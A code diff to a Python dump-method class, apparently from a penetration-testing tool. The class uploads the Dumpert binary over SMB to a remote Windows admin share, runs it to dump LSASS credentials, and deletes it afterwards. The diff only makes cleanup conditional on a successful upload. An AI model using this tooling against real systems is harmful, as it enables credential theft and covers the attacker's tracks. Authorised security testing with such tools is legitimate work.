@@ -20,6 +20,8 @@ class DumpMethod(IDumpMethod):
         self.dumpert_remote_share = "C$"
         self.dumpert_remote_path = "\\Windows\\Temp\\"
 
+        self.dumpert_uploaded = False
+
     def prepare(self, options):
         self.dumpert = options.get("dumpert", self.dumpert)
         self.dumpert_path = options.get("dumpert_path", self.dumpert_path)
@@ -40,24 +42,26 @@ class DumpMethod(IDumpMethod):
             try:
                 self._session.smb_session.putFile(self.dumpert_remote_share, self.dumpert_remote_path + self.dumpert, p.read)
                 logging.success("dumpert successfully uploaded")
+                self.dumpert_uploaded = True
                 return True
             except Exception as e:
                 logging.error("dumpert upload error", exc_info=True)
                 return None
 
     def clean(self):
-        t = time.time()
-        while True:
-            try:
-                self._session.smb_session.deleteFile(self.dumpert_remote_share, self.dumpert_remote_path + self.dumpert)
-                logging.debug("dumpert successfully deleted")
-                return True
-            except Exception as e:
-                if time.time() - t > 5:
-                    logging.warning("dumpert deletion error.")
-                    return False
-                logging.debug("dumpert deletion error. Retrying...")
-                time.sleep(0.2)
+        if self.dumpert_uploaded:
+            t = time.time()
+            while True:
+                try:
+                    self._session.smb_session.deleteFile(self.dumpert_remote_share, self.dumpert_remote_path + self.dumpert)
+                    logging.debug("dumpert successfully deleted")
+                    return True
+                except Exception as e:
+                    if time.time() - t > 5:
+                        logging.warning("dumpert deletion error.")
+                        return False
+                    logging.debug("dumpert deletion error. Retrying...")
+                    time.sleep(0.2)
 
     def get_commands(self):
         cmd_command = """{}{}""".format(self.dumpert_remote_path, self.dumpert)
